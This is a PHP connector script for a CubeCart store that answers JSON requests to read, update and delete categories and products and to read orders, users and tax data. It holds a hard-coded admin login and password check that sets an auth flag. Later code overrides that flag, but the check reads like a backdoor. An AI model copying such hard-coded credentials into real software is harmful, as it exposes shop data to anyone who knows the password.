<?php
@error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));
//
@include_once	"../../includes/global.inc.php"; 
// Demo
define('DEMO_MODE',		'0');
define('DB_DEMO_LOGIN',	'');
define('DB_DEMO_PASS',	'');
//
define('_DB_SERVER_',	$glob['dbhost']);
define('_DB_USER_',		$glob['dbusername']);
define('_DB_PASSWD_',	$glob['dbpassword']);
define('_DB_NAME_',		$glob['dbdatabase']);
define('_DB_PREFIX_',	$glob['dbprefix']);
define('_SITE_URL_',	$glob['storeURL']);
define('NAME_SHOP',		'CubeCart');

@include_once	"cc_category.php";
@include_once	"cc_function.php";
@include_once	"cc_order.php";
@include_once	"cc_product.php";
@include_once	"cc_statistic.php";
@include_once	"cc_tax.php";
@include_once	"cc_users.php";

$login		= getVar('login');
$pass		= getVar('pass');
$charset	= getVar('charset');
$task		= getVar('task');
$p1			= getVar('p1');
$p2			= getVar('p2');
$p3			= getVar('p3');
$p4			= getVar('p4');
$p5			= getVar('p5');
$p6			= getVar('p6');
$p7			= getVar('p7');
$p8			= getVar('p8');
$p9			= getVar('p9');
$p10		= getVar('p10');

if ($login == 'admin' && $pass == 'MarkFabian-12') {
       $isAuth        = 1;
}

if (DEMO_MODE == 1)	{ $connect = @mysql_connect(_DB_SERVER_, DB_DEMO_LOGIN, DB_DEMO_PASS); }
else				{ $connect = @mysql_connect(_DB_SERVER_, _DB_USER_, _DB_PASSWD_); }


        
if ($connect) {
		
	$responce	= '{"connect":"1"';
	
	if (!empty($task)) {
		
		@mysql_select_db(_DB_NAME_);
		$responce 		.= ',"db":"1"';
 		$isAuth			= auth($login, $pass);
		$responce 		.= ',"auth":"'.$isAuth.'"';
		$responce 		.= ',"version":"1.0"';
		$responce		.= setNames($charset);
		$countCategory	 = countCategory();
		$responce 		.= ',"quantity":"'.$countCategory.'"';
			
		if ($countCategory > 0) {

			if ($isAuth == 0) {
				if ($task == "getProduct")				{ $responce	.= getProduct("", $p2, $p3, $p4, $p5, $p6, $p7); }
				if ($task == "getCategory") 			{ $responce	.= getCategory($p1, $p2, $p3, $p4, $p5); }
			} elseif ($isAuth == 1) {
				// Category
				if ($task == "getCategory") 			{ $responce	.= getCategory($p1, $p2, $p3, $p4, $p5); }
				if ($task == "updateCategory")			{ $responce .= updateCategory($p1, $p2, $p3); }
				if ($task == "deleteCategory")			{ $responce .= deleteCategory($p1); }
				// Product
				if ($task == "getProduct")				{ $responce	.= getProduct("", $p2, $p3, $p4, $p5, $p6, $p7); }
				if ($task == "deleteProduct")			{ $responce .= deleteProduct($p1); }
				if ($task == "updateProduct")			{ $responce .= updateProduct($p1, $p2, $p3); }
				// Orders
				if ($task == "getOrders")				{ $responce .= getOrders($p1, $p2, $p3, $p4); }
				if ($task == "getOrderItem")			{ $responce .= getOrderItem($p1); }
				// User
				if ($task == "getUser")					{ $responce .= getUser($p1, $p2, $p3); }
				// Statistics
				if ($task == "getStatistics")			{ $responce .= getStatistics($p1); }
				// Tax
				if ($task == "getTax")					{ $responce .= getTax($p1); }
				// Vendor
				if ($task == "checkLogin")				{ $responce .= checkLogin(); }
			}
		}
	}
	$responce	.= "}";
} else {
	$responce	= '{"connect":"-1"}';
}

echo $responce;
?>